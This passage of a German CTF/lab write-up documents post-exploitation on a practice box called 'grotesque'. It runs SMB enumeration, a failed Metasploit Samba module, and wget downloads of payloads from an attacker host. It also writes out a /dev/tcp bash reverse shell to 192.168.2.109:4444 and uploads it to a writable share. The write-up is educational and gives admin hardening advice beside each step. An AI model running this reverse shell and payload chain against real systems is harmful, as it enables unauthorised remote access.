+                <br><strong>Empfehlung (Admin):</strong> Überwachung von SSH-Logins. Sicherstellen, dass Benutzer nur die minimal notwendigen Rechte haben. Implementierung von Intrusion Detection Systemen (IDS) auf dem Host.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">freddie@grotesque:~$ <span class="command">ss -tulpen</span></div>
+                    <pre>Netid    State     Recv-Q    Send-Q       Local Address:Port       Peer Address:Port                                  
+udp      UNCONN    0         0                  0.0.0.0:68              0.0.0.0:*       ino:15497 sk:1 <->            
+udp      UNCONN    0         0            192.168.2.255:137             0.0.0.0:*       ino:16537 sk:2 <->            
+udp      UNCONN    0         0            192.168.2.119:137             0.0.0.0:*       ino:16536 sk:3 <->            
+udp      UNCONN    0         0                  0.0.0.0:137             0.0.0.0:*       ino:16524 sk:4 <->            
+udp      UNCONN    0         0            192.168.2.255:138             0.0.0.0:*       ino:16539 sk:5 <->            
+udp      UNCONN    0         0            192.168.2.119:138             0.0.0.0:*       ino:16538 sk:6 <->            
+udp      UNCONN    0         0                  0.0.0.0:138             0.0.0.0:*       ino:16525 sk:7 <->            
+<span class="command">tcp      LISTEN    0         128                0.0.0.0:22              0.0.0.0:*       ino:15737 sk:8 <-></span>            
+<span class="command">tcp      LISTEN    0         50                 0.0.0.0:445             0.0.0.0:*       ino:17902 sk:9 <-></span>            
+<span class="command">tcp      LISTEN    0         80               127.0.0.1:3306            0.0.0.0:*       uid:106 ino:16480 sk:a <-></span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `ss -tulpen` wird auf dem Zielsystem ausgeführt, um Netzwerk-Sockets anzuzeigen.
+                 *   `-t`: Zeigt TCP-Sockets an.
+                 *   `-u`: Zeigt UDP-Sockets an.
+                 *   `-l`: Zeigt nur lauschende (listening) Sockets an.
+                 *   `-p`: Zeigt den Prozess an, der den Socket verwendet.
+                 *   `-e`: Zeigt erweiterte Socket-Informationen an.
+                 *   `-n`: Zeigt numerische Adressen und Ports an (verhindert DNS-Lookups).
+             Die Ausgabe zeigt mehrere UDP-Ports (DHCP, NetBIOS) und drei lauschende TCP-Ports:
+                 *   Port 22 (0.0.0.0): SSH-Dienst, über den wir verbunden sind.
+                 *   Port 445 (0.0.0.0): SMB/CIFS-Dienst (Samba).
+                 *   Port 3306 (127.0.0.1): MySQL-Datenbankdienst, der nur auf dem Loopback-Interface (localhost) lauscht.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Diese Ausgabe ist sehr aufschlussreich. Zusätzlich zu SSH und HTTP (denen wir von außen begegnet sind, obwohl HTTP hier nicht lauschend auf 0.0.0.0 gelistet ist - wahrscheinlich läuft Apache hinter einem Reverse-Proxy oder ist anders konfiguriert) sehen wir einen SMB-Dienst auf Port 445, der von außen erreichbar ist, und einen MySQL-Dienst, der nur lokal erreichbar ist. Der SMB-Dienst ist ein potenziell interessanter Angriffsvektor für weitere Enumeration oder Privilege Escalation. Die MySQL-Datenbank könnte ebenfalls interessante Daten enthalten, falls wir einen Weg finden, darauf zuzugreifen (z.B. über Webanwendungs-Schwachstellen oder falls Konfigurationsdateien Klartext-Passwörter enthalten).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der SMB-Dienst (Port 445) sollte als nächstes untersucht werden. Mit `smbclient` kann versucht werden, Shares aufzulisten und auf sie zuzugreifen, möglicherweise mit den aktuellen `freddie`-Anmeldeinformationen. Die lokale MySQL-Datenbank ist ebenfalls ein Ziel, aber der Zugriff erfordert wahrscheinlich weitere Schritte.<br><strong>Empfehlung (Admin):</strong> Überprüfen, ob der SMB-Dienst wirklich benötigt wird und ob er sicher konfiguriert ist (aktuelle Samba-Version, starke Passwörter, korrekte Freigabeberechtigungen). Der MySQL-Dienst sollte nur lokal lauschen, wenn kein externer Zugriff erforderlich ist (was hier der Fall ist und gut ist). Zugangsdaten zur Datenbank sollten sicher gespeichert und nicht in Klartext in Konfigurationsdateien abgelegt werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">freddie@grotesque:~$ <span class="command">smbclient -L 127.0.0.1</span></div>
+                    <pre>Unable to initialize messaging context
+:
+Enter WORKGROUP\freddie's password: <span class="password">[Passwort hier eingegeben: 61a4e3e60c063d1e472dd780f64e6cad]</span>
+:
+	Sharename       Type      Comment
+	---------       ----      -------
+<span class="command">	print$          Disk      Printer Drivers</span>
+<span class="command">	grotesque       Disk      grotesque</span>
+<span class="command">	IPC$            IPC       IPC Service (Samba 4.9.5-Debian)</span>
+Reconnecting with SMB1 for workgroup listing.
+
+	Server               Comment
+	---------            -------
+
+	Workgroup            Master
+	---------            -------
+<span class="command">	WORKGROUP            GROTESQUE</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `smbclient -L 127.0.0.1` wird verwendet, um die verfügbaren SMB-Shares auf dem lokalen Host (127.0.0.1) aufzulisten. Da der SMB-Dienst auf Port 445 lauscht, wird dieser abgefragt. Es wird das Passwort für den aktuellen Benutzer (`freddie` in der Domäne `WORKGROUP`) abgefragt und das bekannte Passwort eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Befehl war erfolgreich und listet drei Shares auf:
+                 *   `print$`: Standard-Share für Druckertreiber.
+                 *   `grotesque`: Ein benutzerdefinierter Share, der potenziell interessant ist.
+                 *   `IPC$`: Standard-Share für Interprozesskommunikation.
+             Die Version von Samba (4.9.5-Debian) wird ebenfalls angezeigt. Der Share `grotesque` ist das wahrscheinlichste Ziel für weitere Untersuchungen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Als nächstes sollte versucht werden, sich mit dem `grotesque`-Share zu verbinden, um dessen Inhalt zu untersuchen: `smbclient \\\\127.0.0.1\\grotesque`. Auch hier werden wahrscheinlich die `freddie`-Zugangsdaten funktionieren.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Konfiguration des `grotesque`-Shares. Wer hat Zugriff? Welche Berechtigungen sind gesetzt? Sind die Daten auf dem Share sensibel? Stellen Sie sicher, dass nur autorisierte Benutzer Zugriff haben und die Berechtigungen dem Prinzip der geringsten Rechte folgen. Halten Sie Samba auf dem neuesten Stand, um bekannte Schwachstellen zu vermeiden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">freddie@grotesque:~$ <span class="command">ls</span></div>
+                    <pre>user.txt</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der einfache Befehl `ls` wird im Home-Verzeichnis des Benutzers `freddie` ausgeführt (`/home/freddie`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Befehl zeigt die Datei `user.txt` an. In CTF-Szenarien enthält diese Datei typischerweise die Benutzerflagge.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Inhalt der Datei `user.txt` mit `cat user.txt` auslesen, um die Flag zu erhalten.<br><strong>Empfehlung (Admin):</strong> In einer realen Umgebung sollten sensible Daten oder Flags nicht einfach im Home-Verzeichnis liegen. Zugriffskontrollen und Verschlüsselung verwenden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">freddie@grotesque:~$ <span class="command">cat user.txt</span></div>
+                    <pre><span class="password">35A7EB682E33E89606102A883596A880f</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `cat user.txt` liest den Inhalt der Datei `user.txt` aus und gibt ihn auf der Konsole aus.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Benutzerflagge wurde erfolgreich ausgelesen: `<span class="password">35A7EB682E33E89606102A883596A880f</span>`. Der erste Teil des Ziels (Initial Access und User Flag) ist damit erreicht.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die User-Flag notieren. Nun vollständig auf die Privilege Escalation konzentrieren, um Root-Zugriff zu erlangen. Der SMB-Share `grotesque` und die lokale MySQL-Datenbank sind weiterhin potenzielle Ansatzpunkte.<br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlung bezüglich der Platzierung sensibler Daten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">freddie@grotesque:~$ <span class="command">smbclient \\\\127.0.0.1\\grotesque</span></div>
+                    <pre>Unable to initialize messaging context
+Enter WORKGROUP\freddie's password: <span class="password">[Passwort hier eingegeben]</span>
+Try "help" to get a list of possible commands.
+smb: \> </pre>
+                    <div class="prompt">smb: \> <span class="command">ls</span></div>
+                    <pre>  .                                   D        0  Sun Jul 11 09:24:27 2021
+  ..                                  D        0  Sun Jul 11 09:20:30 2021
+
+		1942736 blocks of size 1024. 674116 blocks available</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich mit dem zuvor identifizierten SMB-Share `grotesque` auf dem lokalen Host zu verbinden (`smbclient \\\\127.0.0.1\\grotesque`). Das Passwort für `freddie` wird eingegeben, und die Verbindung ist erfolgreich, was durch den `smb: \>` Prompt angezeigt wird. Der Befehl `ls` innerhalb der `smbclient`-Sitzung listet den Inhalt des Shares auf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der `grotesque`-Share ist momentan leer (enthält nur die Verweise auf das aktuelle `.` und das übergeordnete `..` Verzeichnis). Das ist unerwartet und deutet darauf hin, dass der Share möglicherweise für einen anderen Zweck dient, z.B. als Ablageort für Dateien von außen oder als Teil eines Mechanismus zur Rechteausweitung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Obwohl der Share leer ist, ist die Tatsache, dass wir Schreibzugriff haben könnten (muss noch geprüft werden), interessant. Man könnte versuchen, eine Datei hochzuladen (`put datei.txt`). Der Share könnte Teil einer geplanten Aufgabe (Cronjob) sein oder von einem anderen Prozess überwacht werden. Weitere Enumeration auf dem System ist notwendig, um den Zweck des Shares zu verstehen.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Konfiguration des `grotesque`-Shares. Warum existiert er? Wer hat Schreibzugriff? Wenn er nicht benötigt wird, sollte er entfernt werden. Wenn er benötigt wird, sollten die Berechtigungen so restriktiv wie möglich sein.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">freddie@grotesque:/tmp$ <span class="command">wget http://192.168.2.109:8000/rev.php</span></div>
+                     <pre>
+ --2022-11-15 17:12:40--  http://192.168.2.109:8000/rev.php
+ Connecting to 192.168.2.109:8000... connected.
+ HTTP request sent, awaiting response... 200 OK
+ Length: 5495 (5.4K) [application/octet-stream]
+ Saving to: ‘rev.php’
+
+ rev.php                       100%[=====================================================>]   5.37K  --.-KB/s    in 0s      
+
+ <span class="password">2022-11-15 17:12:40 (79.6 MB/s) - ‘rev.php’ saved [5495/5495]</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Benutzer `freddie` wechselt in das Verzeichnis `/tmp` (ein häufig beschreibbares Verzeichnis) und lädt mit `wget` eine Datei namens `rev.php` von einem externen Webserver (wahrscheinlich vom Angreifer-System 192.168.2.109 auf Port 8000) herunter.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Hier wird offenbar versucht, eine Reverse-Shell-Payload (`rev.php`) auf das Zielsystem zu bringen. Der Download ist erfolgreich. Der nächste Schritt wäre wahrscheinlich, diese PHP-Datei über den Webserver oder eine andere Methode auszuführen, um eine Verbindung zurück zum Angreifer zu erhalten. Der Dateiname `rev.php` legt nahe, dass dies über die LFI-Schwachstelle oder eine andere Web-Schwachstelle geschehen soll.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nachdem `rev.php` in `/tmp` liegt, muss ein Weg gefunden werden, sie auszuführen. Optionen:
+                 1.  Versuchen, sie über die LFI-Schwachstelle einzubinden (`?purpose=/tmp/rev.php`), falls die LFI das erlaubt.
+                 2.  Hochladen der Datei in ein Web-Verzeichnis (z.B. über den SMB-Share, falls dieser ins Web-Root gemappt ist) und direkt aufrufen.
+                 3.  Finden einer anderen Möglichkeit zur Codeausführung.
+                 <br><strong>Empfehlung (Admin):</strong> Beschränken Sie die Möglichkeit für Benutzer, Dateien aus dem Internet herunterzuladen (`wget`, `curl`), insbesondere in öffentlichen Verzeichnissen wie `/tmp`. Konfigurieren Sie den Webserver so, dass er keine Skripte aus Verzeichnissen wie `/tmp` ausführt. Überwachen Sie ausgehende Verbindungen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">freddie@grotesque:/tmp$ <span class="command">smbclient \\\\127.0.0.1\\grotesque</span></div>
+                     <pre>Unable to initialize messaging context
+ Enter WORKGROUP\freddie's password: <span class="password">[Passwort hier eingegeben]</span>
+ Try "help" to get a list of possible commands.
+ smb: \> </pre>
+                     <div class="prompt">smb: \> <span class="command">put rev.php</span></div>
+                     <pre>putting file rev.php as \rev.php (214.6 kb/s) (average 214.6 kb/s)</pre>
+                     <div class="prompt">smb: \> </div>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird erneut eine Verbindung zum SMB-Share `grotesque` hergestellt. Innerhalb der `smbclient`-Sitzung wird der Befehl `put rev.php` verwendet, um die zuvor heruntergeladene Datei `rev.php` (aus `/tmp`, dem aktuellen Verzeichnis von `freddie`) auf den Share hochzuladen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Upload war erfolgreich. Die Datei `rev.php` befindet sich nun im Stammverzeichnis des `grotesque`-Shares. Dies bestätigt, dass der Benutzer `freddie` Schreibrechte auf diesem Share hat. Dies könnte der beabsichtigte Weg sein, um Code zur Ausführung zu bringen, falls der Share-Pfad mit einem Web-Verzeichnis oder einem anderen Mechanismus verbunden ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Prüfen, ob der Inhalt des Shares über den Webserver erreichbar ist. Wenn der Share z.B. auf `/var/www/html/uploads` oder einen ähnlichen Pfad gemappt ist, könnte `http://grotek.hmv/uploads/rev.php` die Reverse Shell auslösen. Wenn nicht, muss weiter nach dem Zweck des Shares und der hochgeladenen Datei gesucht werden.<br><strong>Empfehlung (Admin):</strong> Erneut: Berechtigungen für SMB-Shares überprüfen und minimieren. Sicherstellen, dass von Shares hochgeladene Dateien nicht direkt vom Webserver ausgeführt werden können, es sei denn, dies ist absolut notwendig und entsprechend abgesichert (z.B. durch Virenscanner, Dateityp-Prüfung, Ausführungsbeschränkungen).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">freddie@grotesque:~$ <span class="command">cat user.txt</span></div>
+                    <pre><span class="password">35A7EB682E33E89606102A883596A880freddie@grotesque:~$</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `cat user.txt` wird erneut ausgeführt. Die Ausgabe enthält die Flag, gefolgt vom Prompt in derselben Zeile.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies scheint eine versehentliche Wiederholung des vorherigen Befehls oder ein kleiner Fehler in der Befehlseingabe/-ausgabe zu sein (die Flag und der Prompt stehen in einer Zeile). Inhaltlich bringt es keine neuen Informationen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Keine Aktion erforderlich, die Flag ist bereits bekannt. Weiter mit der Privilege Escalation.<br><strong>Empfehlung (Admin):</strong> Keine spezifische Aktion aufgrund dieser Wiederholung.</p>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2 id="proof-of-concept">Privilege Escalation (Proof of Concept)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Die folgenden Schritte dokumentieren den Prozess der Eskalation von Benutzerrechten von `freddie` zu `root`. Dies dient als Proof of Concept für die identifizierten Schwachstellen und Fehlkonfigurationen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt vom Angreifer-System hier, da der Befehl direkt ausgeführt wird (vermutlich von einem Skript oder Tool) -->
+                    <pre>[] exec: nbtscan -r 192.168.2.1/24
+
+Doing NBT name scan for addresses from 192.168.2.1/24
+
+IP address       NetBIOS Name     Server    User             MAC address      
+------------------------------------------------------------------------------
+192.168.2.109    <unknown>                  <unknown>        
+192.168.2.108    CYBER1908        <server>  <unknown>        c8:e2:65:09:fc:7c
+192.168.2.255	<span class="password">Sendto failed: Permission denied</span>
+192.168.2.188    GHOST            <server>  <unknown>        f0:2f:74:1a:68:c0</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `nbtscan -r 192.168.2.1/24` wird ausgeführt. `nbtscan` sucht im angegebenen Netzwerkbereich nach NetBIOS-Namensinformationen. Das `[] exec:` deutet darauf hin, dass dieser Befehl möglicherweise innerhalb eines anderen Tools oder Frameworks (wie Metasploit) ausgeführt wurde. Es listet einige Hosts im Netzwerk auf, darunter das Angreifer-System (192.168.2.109) und andere.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dieser Scan liefert Informationen über andere Windows/Samba-Hosts im Netzwerk, ist aber für die direkte Privilege Escalation auf `grotesque` (192.168.2.119) wahrscheinlich nicht unmittelbar relevant, es sei denn, es gäbe Interaktionen zwischen diesen Systemen. Der Fehler "Sendto failed: Permission denied" für die Broadcast-Adresse (192.168.2.255) ist normal, wenn der Befehl nicht mit Root-Rechten ausgeführt wird.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Informationen über andere Hosts können für laterales Movement nützlich sein, aber der Fokus sollte auf der Eskalation auf dem aktuellen System bleiben. Die Ausführung innerhalb eines Frameworks deutet möglicherweise auf die Verwendung von Metasploit hin.<br><strong>Empfehlung (Admin):</strong> NetBIOS ist ein älteres Protokoll und sollte wenn möglich deaktiviert werden, um die Angriffsfläche und die Informationspreisgabe im Netzwerk zu reduzieren.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt metasploit-prompt">msf6 auxiliary(admin/smb/samba_symlink_traversal) > <span class="command">set rhosts 192.168.2.119</span></div>
+                     <pre>rhosts => 192.168.2.119</pre>
+                     <div class="prompt metasploit-prompt">msf6 auxiliary(admin/smb/samba_symlink_traversal) > <span class="command">run</span></div>
+                     <pre>[] Running module against 192.168.2.119
+
+[] 192.168.2.119:445 - Connecting to the server...
+<span class="password">[-] 192.168.2.119:445 - Auxiliary failed: Rex::ConnectionTimeout The connection with (192.168.2.119:445) timed out.</span>
+[-] 192.168.2.119:445 - Call stack:
+[-] 192.168.2.119:445 -   /usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/rex-socket-0.1.43/lib/rex/socket/comm/local.rb:292:in `rescue in create_by_type'
+[-] 192.168.2.119:445 -   /usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/rex-socket-0.1.43/lib/rex/socket/comm/local.rb:264:in `create_by_type'
+[-] 192.168.2.119:445 -   /usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/rex-socket-0.1.43/lib/rex/socket/comm/local.rb:34:in `create'
+[-] 192.168.2.119:445 -   /usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/rex-socket-0.1.43/lib/rex/socket.rb:51:in `create_param'
+[-] 192.168.2.119:445 -   /usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/rex-socket-0.1.43/lib/rex/socket/tcp.rb:37:in `create_param'
+[-] 192.168.2.119:445 -   /usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/rex-socket-0.1.43/lib/rex/socket/tcp.rb:28:in `create'
+[-] 192.168.2.119:445 -   /usr/share/metasploit-framework/lib/msf/core/exploit/remote/tcp.rb:102:in `connect'
+[-] 192.168.2.119:445 -   /usr/share/metasploit-framework/lib/msf/core/exploit/remote/smb/client.rb:106:in `connect'
+[-] 192.168.2.119:445 -   /usr/share/metasploit-framework/modules/auxiliary/admin/smb/samba_symlink_traversal.rb:51:in `run'
+<span class="password">[] Auxiliary module execution completed</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Hier wird das Metasploit Framework verwendet. Das Auxiliary-Modul `admin/smb/samba_symlink_traversal` wird geladen, um eine bekannte Schwachstelle in älteren Samba-Versionen auszunutzen, die das Traversieren des Dateisystems über symbolische Links auf SMB-Shares erlaubt. Das Ziel (`RHOSTS`) wird auf 192.168.2.119 gesetzt und das Modul mit `run` ausgeführt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Metasploit-Modul schlägt fehl. Der Fehler `Rex::ConnectionTimeout` deutet darauf hin, dass keine Verbindung zum SMB-Dienst auf Port 445 hergestellt werden konnte, obwohl Nmap und `ss` diesen Port als offen und lauschend angezeigt haben. Möglicherweise blockiert eine Firewall die Verbindung von Metasploit, oder der Dienst reagiert nicht wie erwartet.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da dieser automatisierte Versuch fehlschlug, sollte man zu manuellen Methoden zurückkehren oder die Konfiguration des Metasploit-Moduls überprüfen (z.B. SMB-Version, Authentifizierung). Die vorherigen manuellen `smbclient`-Verbindungen waren jedoch erfolgreich, was das Timeout hier merkwürdig macht. Eventuell ein temporäres Netzwerkproblem oder eine spezifische Blockade gegen Metasploit-Verbindungen. Der Fokus sollte wieder auf der Untersuchung des `grotesque`-Shares und der hochgeladenen `rev.php` liegen.<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass Samba auf eine Version gepatcht ist, die nicht für Symlink-Traversal-Angriffe anfällig ist (die hier verwendete Version 4.9.5 *könnte* je nach Patchlevel noch anfällig sein, aber der Exploit schlug fehl). Firewall-Regeln überprüfen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh freddie@grotek.hmv</span></div>
+                     <pre>freddie@grotek.hmv's password: <span class="password">[Passwort hier eingegeben]</span>
+ Linux grotesque 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64
+
+ The programs included with the Debian GNU/Linux system are free software;
+ the exact distribution terms for each program are described in the
+ individual files in /usr/share/doc//copyright.
+
+ Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+ permitted by applicable law.</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird sich erneut per SSH als Benutzer `freddie` auf dem Zielsystem angemeldet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt, dass der SSH-Zugang weiterhin funktioniert. Es ist üblich, während eines Pentests mehrere Shells zu öffnen oder sich neu zu verbinden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die zuvor unterbrochene Untersuchung fortsetzen, insbesondere bezüglich des SMB-Shares und der Privilege Escalation.<br><strong>Empfehlung (Admin):</strong> Keine spezifische Aktion aufgrund dieser erneuten Anmeldung.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">freddie@grotesque:/tmp$ <span class="command">smbclient \\\\127.0.0.1\\grotesque</span></div>
+                     <pre>Unable to initialize messaging context
+ Enter WORKGROUP\freddie's password: <span class="password">[Passwort hier eingegeben]</span>
+ Try "help" to get a list of possible commands.</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Erneute Verbindung zum SMB-Share `grotesque` als `freddie` von der Shell auf dem Zielsystem aus.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Verbindung ist wieder erfolgreich. Dies deutet darauf hin, dass der Share weiterhin zugänglich ist und wahrscheinlich der Schlüssel zur nächsten Phase ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen, ob die zuvor hochgeladene `rev.php` noch vorhanden ist und ob nun andere Dateien vorhanden sind. Der Fokus liegt nun darauf, herauszufinden, wie dieser Share für die Rechteausweitung genutzt werden kann.<br><strong>Empfehlung (Admin):</strong> Siehe frühere Empfehlungen zur Absicherung von SMB-Shares.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi shell.sh</span></div>
+                     <pre>#!/bin/bash
+ sh -i >& /dev/tcp/192.168.2.109/4444 0&>1</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird mit `vi` eine neue Datei namens `shell.sh` erstellt. Diese Datei enthält ein einfaches Bash-Skript für eine Reverse Shell. Es versucht, eine interaktive Shell (`sh -i`) zu starten und deren Ein- und Ausgabe (`>&`) sowie Fehlerausgabe (`0>&1`, korrekter wäre `2>&1`, aber `>&` leitet oft beides um) an eine TCP-Verbindung zum Angreifer-System (IP 192.168.2.109, Port 4444) umzuleiten.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine Standard-Payload für eine Bash-Reverse-Shell. Sie ist einfach und effektiv, wenn sie auf dem Zielsystem ausgeführt wird und der Angreifer auf dem angegebenen Port lauscht.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dieses Skript muss nun auf das Zielsystem übertragen und dort ausgeführt werden. Der `/tmp`-Ordner und der `grotesque`-SMB-Share sind die wahrscheinlichsten Kandidaten für den Upload.<br><strong>Empfehlung (Admin):</strong> Ausgehende Verbindungen vom Server einschränken (Egress Filtering). Nur notwendige Ports sollten erlaubt sein. Überwachung auf verdächtige Prozesse und Netzwerkverbindungen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">freddie@grotesque:~$ <span class="command">cd /tmp/</span></div>
+                     <div class="prompt">freddie@grotesque:/tmp$ <span class="command">wget http://192.168.2.109:8000/shell.sh</span></div>
+                     <pre>
+ --2022-11-16 04:04:56--  http://192.168.2.109:8000/shell.sh
+ Connecting to 192.168.2.109:8000... connected.
+ HTTP request sent, awaiting response... 200 OK
+ Length: 54 [text/x-sh]
+ Saving to: ‘shell.sh’
+
+ shell.sh                      100%[=====================================================>]      54  --.-KB/s    in 0s      
+
+ <span class="password">2022-11-16 04:04:56 (1.45 MB/s) - ‘shell.sh’ saved [54/54]</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Zielsystem wechselt `freddie` in das `/tmp`-Verzeichnis und lädt die zuvor erstellte `shell.sh` vom Webserver des Angreifers (192.168.2.109:8000) herunter.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Reverse-Shell-Payload befindet sich nun im `/tmp`-Verzeichnis des Zielsystems.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Datei `shell.sh` muss nun ausführbar gemacht (`chmod +x /tmp/shell.sh`) und ausgeführt werden. Alternativ kann sie, wie im nächsten Schritt gezeigt, auf den SMB-Share hochgeladen werden, falls dieser der eigentliche Ausführungsmechanismus ist.<br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlungen zum Einschränken von `wget` und zur Überwachung von `/tmp`.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 -m http.server</span></div>
+                    <pre>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+<span class="password">192.168.2.118 - - [16/Nov/2022 11:04:54] "GET /shell.sh HTTP/1.1" 200 -</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser Befehl wird auf dem Angreifer-System (192.168.2.109, obwohl hier 192.168.2.118 im Log steht - möglicherweise ein Tippfehler im Bericht oder eine andere IP) ausgeführt. Er startet einen einfachen Python-HTTP-Server im aktuellen Verzeichnis, der auf Port 8000 lauscht. Das Log zeigt die erfolgreiche Anfrage (`GET /shell.sh`) vom Zielsystem (hier als 192.168.2.118 geloggt, sollte aber 192.168.2.119 sein) an, die im vorherigen Schritt mit `wget` durchgeführt wurde.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt, dass der Download der `shell.sh` vom Angreifer-Server erfolgreich war. Der Python-Server ist eine schnelle und einfache Methode, um Dateien im lokalen Netzwerk bereitzustellen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der HTTP-Server wird nicht mehr benötigt, nachdem die Datei übertragen wurde (es sei denn, weitere Dateien sollen übertragen werden). Der Fokus liegt nun auf der Ausführung der `shell.sh` auf dem Ziel.<br><strong>Empfehlung (Admin):</strong> Firewalls sollten so konfiguriert sein, dass sie unerwünschte eingehende Verbindungen blockieren. Das Zielsystem sollte keine beliebigen Dateien von internen oder externen HTTP-Servern herunterladen können.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <!-- Innerhalb der smbclient-Sitzung -->
+                     <div class="prompt">smb: \> <span class="command">ls</span></div>
+                     <pre>  .                                   D        0  Sun Jul 11 09:24:27 2021
+   ..                                  D        0  Sun Jul 11 09:20:30 2021
+
+ 		1942736 blocks of size 1024. 674116 blocks available</pre>
+                     <div class="prompt">smb: \> <span class="command">put shell.sh</span></div>
+                     <pre>putting file shell.sh as \shell.sh (2.8 kb/s) (average 2.8 kb/s)</pre>
+                     <div class="prompt">smb: \> <span class="command">ls</span></div>
+                     <pre>  .                                   D        0  Wed Nov 16 04:06:03 2022
+   ..                                  D        0  Sun Jul 11 09:20:30 2021
+   <span class="command">shell.sh                            A       54  Wed Nov 16 04:06:03 2022</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Innerhalb der `smbclient`-Verbindung zum `grotesque`-Share wird zuerst der Inhalt aufgelistet (der Share ist leer). Dann wird die Datei `shell.sh` (die sich im `/tmp`-Verzeichnis auf dem Zielsystem befindet, von wo `smbclient` gestartet wurde) mit dem Befehl `put shell.sh` auf den Share hochgeladen. Ein erneutes `ls` bestätigt, dass sich die Datei `shell.sh` nun auf dem Share befindet.</p>
